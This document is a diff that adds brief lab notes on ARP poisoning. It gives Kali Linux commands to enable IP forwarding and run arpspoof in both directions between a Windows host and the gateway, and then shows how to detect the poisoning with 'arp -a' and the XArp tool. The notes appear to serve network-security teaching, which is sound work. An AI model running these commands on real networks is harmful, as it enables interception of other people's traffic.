@@ -1,0 +1,25 @@
+
+-on kali linux 1st terminal:
+>>echo 1 > /proc/sys/net/ipv4/ip_forward    (to enable ip-forwarding)    (/p/s/n/i/i)
+
+>>arpspoof -i eth0 -t winip interface_ip         (for ARP poisoning)
+
+
+-on kali linux 2nd terminal:
+>>arpspoof -i eth0 -t interface_ip winip      
+
+
+
+
+                (windows and kali linux)
+to detect:
+
+
+1)  on windows:
+>>arp -a
+mac address will be changed
+
+
+2)  on XARP tool:
+-go to file and restart
+-red cross against few ip address which are fluctuating are the poisoned arp's.
